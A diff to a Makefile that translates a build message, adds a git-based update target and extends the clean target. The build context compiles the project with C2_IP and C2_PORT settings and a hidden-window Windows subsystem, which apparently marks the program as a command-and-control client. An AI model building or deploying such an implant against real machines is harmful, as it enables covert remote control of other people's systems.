@@ -51,7 +51,7 @@ endif
 all: $(SRC)
 ifeq ($(OS),Windows_NT) # Windows
 	$(eval $(call wininput))
-	@echo "如果你用的是MSYS/MSYS2等等会进入cmd，请输入exit退出"
+	@echo If you are using MSYS/MSYS2 etc. and it enters cmd, please type exit to quit
 	@cmd $(P)/c erase $(P)/f $(P)/q .\.nn .\nn
 ifneq ($(findstring Microsoft,$(shell $(CC) /? 2>&1)),) # Microsoft Visual Studio (MSVC)
 	$(CC) $(SRC) /Fe:$(BIN).exe /O1 /DNDEBUG /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT) /link /subsystem:windows ws2_32.lib
@@ -130,9 +130,21 @@ endif
 endif
 endif
 
+
+update:
+ifeq ($(OS),Windows_NT)
+	# 检测有没有git
+	@cmd $(P)/c "where git >nul 2>&1 && (git pull && echo Update complete) || echo Git not detected, please update manually"
+else
+	# 检测有没有git
+	@sh -c "which git > /dev/null 2>&1 && (git pull && echo Update complete) || echo Git not detected, please update manually"
+endif
+
 clean:
 ifeq ($(OS),Windows_NT)
-	cmd $(P)/c erase $(P)/f $(P)/q $(BIN) $(BIN).*
+	@cmd $(P)/c erase $(P)/f $(P)/q .\.nn .\nn
+	@cmd $(P)/c erase $(P)/f $(P)/q $(BIN) $(BIN).*
 else
-	sh -c "rm -rf $(BIN) $(BIN).*"
+	@sh -c "rm -rf ./nn ./.nn"
+	@sh -c "rm -rf $(BIN) $(BIN).*"
 endif
